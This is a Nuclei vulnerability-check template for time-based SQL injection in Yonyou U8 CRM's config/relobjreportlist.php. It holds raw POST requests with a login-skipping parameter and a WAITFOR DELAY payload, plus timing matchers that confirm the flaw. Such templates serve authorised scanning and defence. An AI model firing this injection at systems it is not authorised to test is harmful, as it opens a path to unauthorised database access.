id: youyouU8-relobjreportlist-sqli

info:
  name: 用友U8 CRM config/relobjreportlist.php SQL注入漏洞
  author: youyouU8
  severity: high
  tags: youyouU8

http:
  - raw:
      - |
        POST /config/relobjreportlist.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID=bgsesstimeout-;

        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1

      - |
        POST /config/relobjreportlist.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID=bgsesstimeout-;

        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:4'--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1 < 2'
          - 'duration_2 >= 4'
          - 'duration_2 <= 10'
        condition: and
      - type: word
        part: body
        words:
          - '"success":true'
          - '"code":'
          - 'WAITFOR'
        condition: and

